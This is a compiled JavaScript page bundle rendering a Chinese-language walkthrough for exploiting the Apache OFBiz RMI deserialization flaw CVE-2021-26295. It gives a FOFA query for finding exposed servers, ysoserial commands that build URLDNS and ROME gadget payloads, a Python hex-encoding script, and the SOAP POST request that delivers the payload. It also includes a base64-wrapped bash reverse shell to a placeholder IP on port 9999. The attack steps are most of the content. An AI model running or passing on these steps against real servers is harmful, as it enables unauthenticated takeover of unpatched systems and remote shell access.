(window.webpackJsonp=window.webpackJsonp||[]).push([[582],{2591:function(a,s,t){a.exports=t.p+"assets/img/c3afc0d1-7dc6-4161-a0fd-901797bf1a31.898ed31c.png"},3282:function(a,s,t){"use strict";t.r(s);var e=t(64),n=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"apache-ofbiz-rmi反序列化漏洞-cve-2021-26295"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#apache-ofbiz-rmi反序列化漏洞-cve-2021-26295"}},[a._v("#")]),a._v(" Apache OFBiz RMI反序列化漏洞 CVE-2021-26295")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("OFBiz是基于Java的Web框架，包括实体引擎，服务引擎和基于小部件的UI。")]),a._v(" "),s("p",[a._v("近日，Apache OFBiz官方发布安全更新。Apache OFBiz 存在RMI反序列化前台命令执行，未经身份验证的攻击者可以使用此漏洞来成功接管Apache OFBiz，建议相关用户尽快测试漏洞修复的版本并及时升级。")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("Apache OFBiz < 17.12.06")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[s("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBcGFjaGVfT0ZCaXoi"}},[a._v('app="Apache_OFBiz"')])],1),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("利用 "),s("code",[a._v("ysoserial")]),a._v("生成反序列化数据")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xxx.xxx.xxx.xxx > payload.txt\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#!/usr/bin/python")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#conding=utf8")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("import")]),a._v(" binascii\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("with")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[a._v("open")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'payload.txt'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'rb'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("as")]),a._v(" payload_handle"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n   content "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" payload_handle"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(".")]),a._v("read"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\nstr_hex "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" binascii"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(".")]),a._v("hexlify"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("content"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("str_hex"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br")])]),s("p",[a._v("发送请求包后查看Dnslog验证漏洞")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("POST /webtools/control/SOAPService \n\n<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><test:clearAllEntityCaches xmlns:test=\"http://ofbiz.apache.org/service/\"><test:cus-obj>dnslog反序列化数据</test:cus-obj></test:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[a._v("反弹Shell可以使用"),s("code",[a._v("ROME反序列化链")])]),a._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("java")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-jar")]),a._v(" ysoserial-0.0.6-SNAPSHOT-all.jar ROME  "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"bash -c {echo,xxxxxxxxxxxxxxxxxxxxxxx}|{base64,-d}|{bash,-i}"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),a._v(" xxd"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("cut")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("2,3")]),a._v(",4,5,6,7,8,9 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('" "')]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("tr")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("' '")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("tr")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'\\n'")]),a._v("\n\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("bash")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'")]),a._v("   base64加密写入然后执行命令\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[s("img",{attrs:{src:t(2591),alt:"c3afc0d1-7dc6-4161-a0fd-901797bf1a31"}})])],1)}),[],!1,null,null,null);s.default=n.exports}}]);